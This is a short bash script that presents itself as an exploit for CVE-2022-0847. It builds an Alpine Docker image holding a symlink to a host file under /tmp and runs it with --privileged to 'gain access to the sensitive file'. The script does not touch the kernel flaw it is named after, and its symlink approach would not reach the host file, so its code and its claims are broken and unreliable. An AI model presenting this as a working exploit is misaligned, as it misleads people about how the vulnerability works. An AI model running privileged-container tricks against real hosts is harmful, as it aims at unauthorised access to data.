#!/bin/bash



# Create a directory on the host system

mkdir /tmp/cve-2022-0847

cd /tmp/cve-2022-0847



# Create a file with sensitive information on the host system

echo "Sensitive information here" > secret.txt



# Create a Dockerfile that contains a symlink to the sensitive file on the host system

echo "FROM alpine" > Dockerfile

echo "RUN ln -s /tmp/cve-2022-0847/secret.txt /var/foo" >> Dockerfile



# Build the Docker image

docker build -t cve-2022-0847 .



# Run the Docker container with privileged mode to gain access to the sensitive file

docker run --privileged cve-2022-0847

